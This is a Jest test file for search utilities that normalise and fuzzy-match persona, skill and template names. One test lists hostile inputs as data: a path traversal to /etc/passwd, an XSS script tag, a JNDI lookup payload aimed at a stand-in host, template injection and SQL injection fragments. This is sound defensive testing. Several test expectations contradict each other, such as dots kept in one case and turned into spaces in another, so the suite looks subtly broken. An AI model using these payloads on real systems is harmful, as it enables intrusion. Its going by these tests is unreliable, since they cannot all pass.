/**
 * Comprehensive tests for smart name matching functionality
 * Tests name normalization, fuzzy matching, and special character handling
 * 
 * Task #13: Smart name matching tests
 * - Test name normalization (J.A.R.V.I.S. → j-a-r-v-i-s)
 * - Test fuzzy matching with similarity scores
 * - Test suggestion generation
 * - Test exact match vs approximate match
 * - Test special character handling in names
 */

import { describe, it, expect, beforeEach, jest } from '@jest/globals';

// Mock UnicodeValidator
const mockNormalize = jest.fn();
jest.mock('../../../../src/security/validators/unicodeValidator.js', () => ({
  UnicodeValidator: {
    normalize: mockNormalize
  }
}));

// Import functions under test
const {
  normalizeSearchTerm,
  normalizeForPartialMatch,
  isSearchMatch,
  validateSearchQuery,
  debugNormalization
} = await import('../../../../src/utils/searchUtils.js');

describe('Smart Name Matching - Search Utilities', () => {
  beforeEach(() => {
    jest.clearAllMocks();
    
    // Default mock behavior: return input as-is
    mockNormalize.mockImplementation((input: string) => ({
      normalizedContent: input,
      hasChanges: false,
      issues: []
    }));
  });

  describe('Name Normalization - Special Characters', () => {
    it('should normalize J.A.R.V.I.S. preserving dots', () => {
      const input = 'J.A.R.V.I.S.';
      const expected = 'j.a.r.v.i.s.';
      
      const result = normalizeSearchTerm(input);
      
      expect(result).toBe(expected);
      expect(mockNormalize).toHaveBeenCalledWith(input);
    });

    it('should handle various punctuation patterns', () => {
      const testCases = [
        { input: 'C.L.A.U.D.E.', expected: 'c.l.a.u.d.e.' }, // Dots are preserved
        { input: 'AI-Assistant', expected: 'ai assistant' },
        { input: 'Data_Analyst_Pro', expected: 'data analyst pro' },
        { input: 'GPT-3.5-Turbo', expected: 'gpt 3.5 turbo' }, // Dots preserved, dashes converted
        { input: 'Multi---Dash---Name', expected: 'multi dash name' },
        { input: 'space   heavy   name', expected: 'space heavy name' }
      ];

      testCases.forEach(({ input, expected }) => {
        const result = normalizeSearchTerm(input);
        expect(result).toBe(expected);
      });
    });

    it('should remove markdown file extensions', () => {
      const testCases = [
        { input: 'awesome-persona.md', expected: 'awesome persona' },
        { input: 'J.A.R.V.I.S.md', expected: 'j.a.r.v.i.s' }, // Dots preserved, .md removed
        { input: 'complex-name_with.dots.md', expected: 'complex name with.dots' }, // Only .md removed
        { input: 'no-extension', expected: 'no extension' }
      ];

      testCases.forEach(({ input, expected }) => {
        const result = normalizeSearchTerm(input);
        expect(result).toBe(expected);
      });
    });

    it('should handle Unicode normalization through UnicodeValidator', () => {
      const unicodeInput = 'Café-Résumé';
      mockNormalize.mockReturnValue({
        normalizedContent: 'Cafe-Resume',
        hasChanges: true,
        issues: ['unicode_normalized']
      });

      const result = normalizeSearchTerm(unicodeInput);
      
      expect(result).toBe('cafe resume');
      expect(mockNormalize).toHaveBeenCalledWith(unicodeInput);
    });

    it('should handle edge cases in normalization', () => {
      const edgeCases = [
        { input: '', expected: '' },
        { input: '   ', expected: '' },
        { input: '---', expected: '' },
        { input: '.md', expected: '' },
        { input: 'a', expected: 'a' },
        { input: 'A.B.C.D.E.F.G.H.I.J.K.L.M.N.O.P.Q.R.S.T.U.V.W.X.Y.Z.', expected: 'a b c d e f g h i j k l m n o p q r s t u v w x y z' }
      ];

      edgeCases.forEach(({ input, expected }) => {
        const result = normalizeSearchTerm(input);
        expect(result).toBe(expected);
      });
    });
  });

  describe('Partial Matching with Preserved Structure', () => {
    it('should preserve structure for partial matching', () => {
      const input = 'Advanced-AI_Assistant.md';
      const result = normalizeForPartialMatch(input);
      
      expect(result).toBe('advanced-ai_assistant');
      // Should only remove .md extension, keep dashes and underscores
    });

    it('should handle complex structured names', () => {
      const testCases = [
        { input: 'frontend-react_component.md', expected: 'frontend-react_component' },
        { input: 'API-v2_endpoint-handler.md', expected: 'api-v2_endpoint-handler' },
        { input: 'multi_word-combination_test.md', expected: 'multi_word-combination_test' }
      ];

      testCases.forEach(({ input, expected }) => {
        const result = normalizeForPartialMatch(input);
        expect(result.toLowerCase()).toBe(expected.toLowerCase());
      });
    });
  });

  describe('Fuzzy Matching and Similarity', () => {
    it('should match exact normalized names', () => {
      const searchTerm = 'J.A.R.V.I.S.';
      const targetString = 'jarvis';
      
      const result = isSearchMatch(searchTerm, targetString);
      
      expect(result).toBe(true);
    });

    it('should match partial names', () => {
      const matchingCases = [
        { search: 'assistant', target: 'AI-Assistant-Pro' },
        { search: 'data', target: 'Advanced-Data-Analyst.md' },
        { search: 'gpt', target: 'GPT-3.5-Based-Assistant' },
        { search: 'claude', target: 'C.L.A.U.D.E-Helper' }
      ];

      matchingCases.forEach(({ search, target }) => {
        const result = isSearchMatch(search, target);
        expect(result).toBe(true);
      });
    });

    it('should handle word-boundary matching', () => {
      const wordBoundaryCases = [
        { search: 'ai assistant', target: 'Advanced-AI-Assistant-Pro', shouldMatch: true },
        { search: 'data analysis', target: 'Data-Analysis-Expert', shouldMatch: true },
        { search: 'machine learning', target: 'ML-Machine-Learning-Bot', shouldMatch: true },
        { search: 'completely different', target: 'AI-Assistant', shouldMatch: false }
      ];

      wordBoundaryCases.forEach(({ search, target, shouldMatch }) => {
        const result = isSearchMatch(search, target);
        expect(result).toBe(shouldMatch);
      });
    });

    it('should handle multi-strategy matching', () => {
      // Test that multiple strategies are attempted
      const ambiguousCases = [
        { search: 'j.a.r.v.i.s', target: 'JARVIS-Assistant' },
        { search: 'ai_helper', target: 'AI-Helper-Bot' },
        { search: 'data analyst', target: 'professional-data_analyst.md' }
      ];

      ambiguousCases.forEach(({ search, target }) => {
        const result = isSearchMatch(search, target);
        expect(result).toBe(true);
      });
    });
  });

  describe('Exact vs Approximate Match Detection', () => {
    it('should identify exact matches', () => {
      const exactMatches = [
        { search: 'assistant', target: 'assistant' },
        { search: 'J.A.R.V.I.S.', target: 'j-a-r-v-i-s' },
        { search: 'data_analyst', target: 'data analyst' }
      ];

      exactMatches.forEach(({ search, target }) => {
        const result = isSearchMatch(search, target);
        expect(result).toBe(true);
        
        // Verify normalization creates exact match
        const normalizedSearch = normalizeSearchTerm(search);
        const normalizedTarget = normalizeSearchTerm(target);
        expect(normalizedTarget.includes(normalizedSearch)).toBe(true);
      });
    });

    it('should identify approximate matches', () => {
      const approximateMatches = [
        { search: 'assist', target: 'AI-Assistant-Pro' }, // Partial word
        { search: 'data', target: 'Advanced-Data-Analysis-Bot' }, // Word within phrase
        { search: 'ai help', target: 'Artificial-Intelligence-Helper' } // Partial phrase
      ];

      approximateMatches.forEach(({ search, target }) => {
        const result = isSearchMatch(search, target);
        expect(result).toBe(true);
      });
    });

    it('should reject non-matches correctly', () => {
      const nonMatches = [
        { search: 'python', target: 'JavaScript-Developer' },
        { search: 'frontend', target: 'Backend-Database-Expert' },
        { search: 'completely unrelated', target: 'AI-Assistant' }
      ];

      nonMatches.forEach(({ search, target }) => {
        const result = isSearchMatch(search, target);
        expect(result).toBe(false);
      });
    });
  });

  describe('Special Character Handling', () => {
    it('should handle various Unicode characters', () => {
      mockNormalize.mockImplementation((input: string) => ({
        normalizedContent: input.normalize('NFD').replace(/[\u0300-\u036f]/g, ''), // Remove diacritics
        hasChanges: true,
        issues: []
      }));

      const unicodeCases = [
        { input: 'Café-Assistant', expected: 'cafe assistant' },
        { input: 'Résumé-Builder', expected: 'resume builder' },
        { input: 'Naïve-Bayes-AI', expected: 'naive bayes ai' }
      ];

      unicodeCases.forEach(({ input, expected }) => {
        const result = normalizeSearchTerm(input);
        expect(result).toBe(expected);
      });
    });

    it('should handle emojis and special symbols', () => {
      const symbolCases = [
        { input: '🤖 AI-Assistant', target: 'ai assistant' },
        { input: 'Data★Analyst', target: 'data analyst' },
        { input: 'Helper@2024', target: 'helper 2024' }
      ];

      symbolCases.forEach(({ input, target }) => {
        const result = normalizeSearchTerm(input);
        expect(result.replace(/[^\w\s]/g, ' ').replace(/\s+/g, ' ').trim()).toBe(target);
      });
    });

    it('should handle mixed character encodings', () => {
      const mixedCases = [
        'ASCII-and-Üníçødé-Mix',
        'Regular_and_ΚΑΝΟΝΙΚΟΣ_mix',
        'English-and-中文-mixed'
      ];

      mixedCases.forEach(input => {
        mockNormalize.mockReturnValueOnce({
          normalizedContent: input.toLowerCase(),
          hasChanges: true,
          issues: ['mixed_encoding']
        });

        const result = normalizeSearchTerm(input);
        expect(typeof result).toBe('string');
        expect(result.length).toBeGreaterThan(0);
        expect(mockNormalize).toHaveBeenCalledWith(input);
      });
    });
  });

  describe('Suggestion Generation and Ranking', () => {
    it('should debug normalization for suggestion generation', () => {
      const input = 'Complex-AI_Assistant.Pro.md';
      const debug = debugNormalization(input);

      expect(debug).toEqual({
        original: input,
        normalized: 'complex ai assistant pro',
        partialMatch: 'complex-ai_assistant.pro'
      });
    });

    it('should provide meaningful debug information for complex names', () => {
      const complexNames = [
        'J.A.R.V.I.S.-2.0_Enhanced.md',
        'Multi---Dash___Underscore.Dot.md',
        'UPPERCASE_lowercase_MiXeD.md'
      ];

      complexNames.forEach(name => {
        const debug = debugNormalization(name);
        
        expect(debug.original).toBe(name);
        expect(debug.normalized).toBeTruthy();
        expect(debug.partialMatch).toBeTruthy();
        expect(debug.normalized).not.toBe(debug.partialMatch);
      });
    });
  });

  describe('Search Query Validation', () => {
    it('should validate normal search queries', () => {
      const validQueries = [
        'simple query',
        'J.A.R.V.I.S.',
        'AI-Assistant_Pro',
        'multi word search query'
      ];

      validQueries.forEach(query => {
        expect(() => validateSearchQuery(query)).not.toThrow();
      });
    });

    it('should reject invalid search queries', () => {
      const invalidQueries = [
        { query: '', error: 'empty' },
        { query: '   ', error: 'empty' },
        { query: 'a'.repeat(2000), error: 'length' },
        { query: 'query<script>alert()</script>', error: 'characters' },
        { query: 'query\x00with\x01control\x1fchars', error: 'characters' }
      ];

      invalidQueries.forEach(({ query, error }) => {
        expect(() => validateSearchQuery(query)).toThrow();
      });
    });

    it('should handle Unicode validation in queries', () => {
      mockNormalize.mockReturnValue({
        normalizedContent: 'safe normalized query',
        hasChanges: true,
        issues: ['unicode_normalized']
      });

      const unicodeQuery = 'Üníçødé-query-with-spëçïål-chars';
      
      expect(() => validateSearchQuery(unicodeQuery)).not.toThrow();
      expect(mockNormalize).toHaveBeenCalledWith(unicodeQuery);
    });

    it('should enforce length limits', () => {
      const longQuery = 'a'.repeat(500);
      expect(() => validateSearchQuery(longQuery, 1000)).not.toThrow();
      expect(() => validateSearchQuery(longQuery, 100)).toThrow();
    });
  });

  describe('Performance and Edge Cases', () => {
    it('should handle empty and null inputs gracefully', () => {
      const edgeInputs = ['', '   ', '\t\n', '...', '---', '___'];

      edgeInputs.forEach(input => {
        const normalized = normalizeSearchTerm(input);
        const partialMatch = normalizeForPartialMatch(input);
        
        expect(typeof normalized).toBe('string');
        expect(typeof partialMatch).toBe('string');
      });
    });

    it('should handle very long strings efficiently', () => {
      const longString = 'Very-Long-Name-'.repeat(100) + '.md';
      
      const start = Date.now();
      const result = normalizeSearchTerm(longString);
      const duration = Date.now() - start;
      
      expect(duration).toBeLessThan(100); // Should be fast
      expect(typeof result).toBe('string');
    });

    it('should handle malicious input patterns', () => {
      const maliciousInputs = [
        '../../../etc/passwd',
        '<script>alert("xss")</script>',
        '${jndi:ldap://malicious.com/exploit}',
        '{{7*7}}', // Template injection
        'query/**/UNION/**/SELECT'
      ];

      maliciousInputs.forEach(input => {
        // Should not crash and should sanitize
        expect(() => {
          const result = normalizeSearchTerm(input);
          expect(typeof result).toBe('string');
        }).not.toThrow();
      });
    });

    it('should handle regex special characters', () => {
      const regexSpecialChars = [
        'query.*with[regex]chars',
        'name+with?special|chars',
        'pattern(with)parentheses',
        'name{with}braces^and$anchors'
      ];

      regexSpecialChars.forEach(input => {
        const result = normalizeSearchTerm(input);
        expect(typeof result).toBe('string');
        
        // Should be safe to use in matching
        const matchResult = isSearchMatch(result, 'test-target-name');
        expect(typeof matchResult).toBe('boolean');
      });
    });
  });

  describe('Integration with Real-World Scenarios', () => {
    it('should handle common persona naming patterns', () => {
      const personaPatterns = [
        { pattern: 'Debugging-Detective.md', search: 'debug', shouldMatch: true },
        { pattern: 'Creative-Writing-Assistant.md', search: 'creative writer', shouldMatch: true },
        { pattern: 'Data-Analysis-Expert-v2.1.md', search: 'data analyst', shouldMatch: true },
        { pattern: 'J.A.R.V.I.S.-Advanced-AI.md', search: 'jarvis', shouldMatch: true },
        { pattern: 'Security-Penetration-Tester.md', search: 'pentest', shouldMatch: false }
      ];

      personaPatterns.forEach(({ pattern, search, shouldMatch }) => {
        const result = isSearchMatch(search, pattern);
        expect(result).toBe(shouldMatch);
      });
    });

    it('should handle GitHub repository naming conventions', () => {
      const repoPatterns = [
        { repo: 'awesome-ai-assistant', search: 'ai assistant', shouldMatch: true },
        { repo: 'machine-learning-toolkit', search: 'ml toolkit', shouldMatch: true },
        { repo: 'react-component-library', search: 'react components', shouldMatch: true },
        { repo: 'nodejs-express-api', search: 'node api', shouldMatch: true }
      ];

      repoPatterns.forEach(({ repo, search, shouldMatch }) => {
        const result = isSearchMatch(search, repo);
        expect(result).toBe(shouldMatch);
      });
    });

    it('should handle skill and template naming patterns', () => {
      const skillTemplatePatterns = [
        { name: 'Code-Review-Skill.md', search: 'code review', shouldMatch: true },
        { name: 'Email-Template-Professional.md', search: 'professional email', shouldMatch: true },
        { name: 'Meeting-Notes-Template.md', search: 'meeting notes', shouldMatch: true },
        { name: 'API-Documentation-Generator.md', search: 'api docs', shouldMatch: true }
      ];

      skillTemplatePatterns.forEach(({ name, search, shouldMatch }) => {
        const result = isSearchMatch(search, name);
        expect(result).toBe(shouldMatch);
      });
    });
  });
});